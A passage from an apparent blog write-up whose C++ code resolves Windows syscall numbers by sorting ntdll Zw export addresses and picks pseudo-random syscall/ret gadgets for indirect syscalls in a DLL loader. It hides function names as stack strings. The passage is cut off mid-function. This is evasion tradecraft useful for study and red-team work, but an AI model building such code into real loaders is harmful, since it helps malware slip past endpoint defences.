I have put the SYSCALL_ENTRY struct a side for a moment and started working with only the DWORD array, the error was gone (could’ve just done the math but it was fun moment) 🌈</p><p>And for <em>putting the SYSCALL_ENTRY a side</em> I mean I had used that only for the 3 <strong>Zw</strong> functions I needed and not to keep the full list of the address I had to sort, for which task I instead used the DWORD infamous array.</p><p>Cool, size issues were solved, so now as recap at this point we have:</p><ul><li>DWORD array with the 4 least significant bytes of all the Zw function addresses</li><li>SYSCALL_ENTRY array of 3 elements holding the memory address of the Zw functions I needed for the DLL loading tasks</li></ul><p>Next task is to sort the DWORD array, with a very ugly Bubble Sort implementation 😀</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token comment">//bubble sort really slow sorting bam bam bam</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> zwCounter<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> zwCounter <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>syscallHalf<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&gt;</span> syscallHalf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            temp <span class="token operator">=</span> syscallHalf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            syscallHalf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> syscallHalf<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
            syscallHalf<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>Now we can figure the SSN of our functions <strong>by looping through the DWORD array and compare each entry with the (4 bytes least significant) half of the address I have retrieved before from the EAT of the ZwAllocateVirtualMemory, ZwProtectVirtualMemory and ZwFlushInstructionCache functions</strong>.</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token comment">//here i can go through the list of the functions looking for what i want and then match it </span>
<span class="token comment">//the index at the match it is the SSN </span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> zwCounter <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> syscallEntries<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    
        <span class="token comment">//recycling variables here for comparing purposes </span>
        addressValue <span class="token operator">=</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>syscalls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>funcAddr<span class="token punctuation">;</span>
        <span class="token comment">//if the address of the syscall we want matches any half of those we want</span>
        <span class="token comment">//we know that's the right SSN</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>syscallHalf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>addressValue <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            syscalls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN <span class="token operator">=</span> i<span class="token punctuation">;</span>
            
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>Bello, looking at the SYSCALL_ENTRY structure now the only missing parameter is the address of a “random” syscall/ret instructions within ntdll.dll I will be jumping to at execution time.</p><p>I could not rely on external functions that returns pseudo-random number so my approach was the following:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token comment">//address where the DLL is been written in memory is pretty much </span>
<span class="token comment">//expected to be different every time</span>
ULONG_PTR currentAddress <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token operator">&amp;</span>RetrieveZwFunctions<span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>syscalls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> syscalls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    
    syscalls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">=</span> <span class="token function">retrieveSCAddr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>baseAddress <span class="token operator">&lt;&lt;</span> <span class="token number">32</span> <span class="token operator">|</span> syscallHalf<span class="token punctuation">[</span><span class="token function">generateRandomFromAddress</span><span class="token punctuation">(</span>currentAddress<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    currentAddress <span class="token operator">=</span> currentAddress <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">;</span> <span class="token comment">//static little jump with no reference whatsoever to motogp</span>
    syscalls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">=</span> <span class="token function">retrieveSCAddr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>baseAddress <span class="token operator">&lt;&lt;</span> <span class="token number">32</span> <span class="token operator">|</span> syscallHalf<span class="token punctuation">[</span><span class="token function">generateRandomFromAddress</span><span class="token punctuation">(</span>currentAddress<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    currentAddress <span class="token operator">=</span> currentAddress <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">;</span>
    syscalls<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">=</span> <span class="token function">retrieveSCAddr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>baseAddress <span class="token operator">&lt;&lt;</span> <span class="token number">32</span> <span class="token operator">|</span> syscallHalf<span class="token punctuation">[</span><span class="token function">generateRandomFromAddress</span><span class="token punctuation">(</span>currentAddress<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>Basically retrieving the function address of the function in memory and convert it to a integer within a given range:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token keyword">int</span> <span class="token function">generateRandomFromAddress</span><span class="token punctuation">(</span>ULONG_PTR ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    uintptr_t address <span class="token operator">=</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>ptr<span class="token punctuation">;</span>
    <span class="token comment">// Extract lower bits from the address and scale to fit the range 1-480</span>
    <span class="token keyword">int</span> randomNumber <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>address <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFF</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">400</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> randomNumber<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>Finally, <strong>use that integer value to pick a “pseudo-random” half-address in the DWORD array, give back to it its most significant half and walk from that address onwards till the syscall/ret instructions are found:</strong></p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token comment">//retrieve syscall instructions address</span>
PBYTE <span class="token function">retrieveSCAddr</span><span class="token punctuation">(</span>PBYTE funcStar<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">int</span> emergencybreak <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>funcStar <span class="token operator">&amp;&amp;</span> emergencybreak <span class="token operator">&lt;</span> <span class="token number">2048</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//taking into account indianess crazyness</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>funcStar<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x0f</span> <span class="token operator">&amp;&amp;</span> funcStar<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x05</span> <span class="token operator">&amp;&amp;</span> funcStar<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0xc3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token keyword">return</span> funcStar<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        funcStar<span class="token operator">++</span><span class="token punctuation">;</span>
        emergencybreak<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>bello, I paste here again the full implementation of the <strong>RetrieveZwFunctions</strong> function as reference (also because there won’t be a repository for this, yet):</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token comment">/*------------------FIND ZW FUNCTIONS------------------*/</span>

<span class="token keyword">void</span> <span class="token function">RetrieveZwFunctions</span><span class="token punctuation">(</span>IN HMODULE hModule<span class="token punctuation">,</span> IN PSYSCALL_ENTRY syscalls<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    PBYTE pBase <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>hModule<span class="token punctuation">;</span>

    PIMAGE_DOS_HEADER pImgDosHdr <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pBase<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pImgDosHdr<span class="token operator">-&gt;</span>e_magic <span class="token operator">!=</span> IMAGE_DOS_SIGNATURE<span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>

    PIMAGE_NT_HEADERS pImgNtHdrs <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgDosHdr<span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pImgNtHdrs<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>

    IMAGE_OPTIONAL_HEADER ImgOptHdr <span class="token operator">=</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">;</span>
    PIMAGE_EXPORT_DIRECTORY pImgExportDir <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> ImgOptHdr<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

    PDWORD FunctionNameArray <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span>
    PDWORD FunctionAddressArray <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span>
    PWORD  FunctionOrdinalArray <span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//variables for syscall</span>
    CHAR zw<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Z'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    CHAR ZwAllocateVirtualMemory<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    CHAR ZwProtectVirtualMemory<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    CHAR ZwFlushInstructionCache<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Z'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> zwCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> syscallEntries <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    DWORD syscallHalf<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    PBYTE functionAddress <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    uintptr_t addressValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    DWORD baseAddress <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>
    DWORD temp <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>

    <span class="token comment">// looping through all the exported functions</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pImgExportDir<span class="token operator">-&gt;</span>NumberOfFunctions<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        
        CHAR<span class="token operator">*</span> pFunctionName <span class="token operator">=</span> <span class="token punctuation">(</span>CHAR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> FunctionNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ComprareNStringASCII</span><span class="token punctuation">(</span>zw<span class="token punctuation">,</span> pFunctionName<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            functionAddress <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> FunctionAddressArray<span class="token punctuation">[</span>FunctionOrdinalArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//here i have to fill the struct with function names, address of syscall/ret and ssn</span>
            addressValue <span class="token operator">=</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>functionAddress<span class="token punctuation">;</span>
            syscallHalf<span class="token punctuation">[</span>zwCounter<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span> <span class="token punctuation">(</span>addressValue <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            zwCounter<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token comment">//what i still need to do is to retrieve the syscall instruction to jump to</span>
            
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ComprareStringASCII</span><span class="token punctuation">(</span>ZwAllocateVirtualMemory<span class="token punctuation">,</span> pFunctionName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                
                syscalls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">(</span>FARPROC<span class="token punctuation">)</span>functionAddress<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
                syscallEntries<span class="token operator">++</span><span class="token punctuation">;</span>
            
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ComprareStringASCII</span><span class="token punctuation">(</span>ZwProtectVirtualMemory<span class="token punctuation">,</span> pFunctionName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                
                syscalls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>FARPROC<span class="token punctuation">)</span>functionAddress<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
                syscallEntries<span class="token operator">++</span><span class="token punctuation">;</span>
            
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ComprareStringASCII</span><span class="token punctuation">(</span>ZwFlushInstructionCache<span class="token punctuation">,</span> pFunctionName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                syscalls<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>FARPROC<span class="token punctuation">)</span>functionAddress<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
                syscallEntries<span class="token operator">++</span><span class="token punctuation">;</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        
    <span class="token punctuation">}</span>
    <span class="token comment">//this base address i need only once</span>
    baseAddress <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>addressValue <span class="token operator">&gt;&gt;</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">//bubble sort really slow sorting </span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> zwCounter<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> zwCounter <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>syscallHalf<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&gt;</span> syscallHalf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                temp <span class="token operator">=</span> syscallHalf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                syscallHalf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> syscallHalf<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
                syscallHalf<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    
    <span class="token punctuation">}</span>

    <span class="token comment">//here i can go through the list of the half-addresses that i have and pick two </span>
    <span class="token comment">//random syscall/ret</span>
    ULONG_PTR currentAddress <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token operator">&amp;</span>RetrieveZwFunctions<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>syscalls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> syscalls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    
        
        syscalls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">=</span> <span class="token function">retrieveSCAddr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>baseAddress <span class="token operator">&lt;&lt;</span> <span class="token number">32</span> <span class="token operator">|</span> syscallHalf<span class="token punctuation">[</span><span class="token function">generateRandomFromAddress</span><span class="token punctuation">(</span>currentAddress<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        currentAddress <span class="token operator">=</span> currentAddress <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">;</span>
        syscalls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">=</span> <span class="token function">retrieveSCAddr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>baseAddress <span class="token operator">&lt;&lt;</span> <span class="token number">32</span> <span class="token operator">|</span> syscallHalf<span class="token punctuation">[</span><span class="token function">generateRandomFromAddress</span><span class="token punctuation">(</span>currentAddress<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        currentAddress <span class="token operator">=</span> currentAddress <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">;</span>
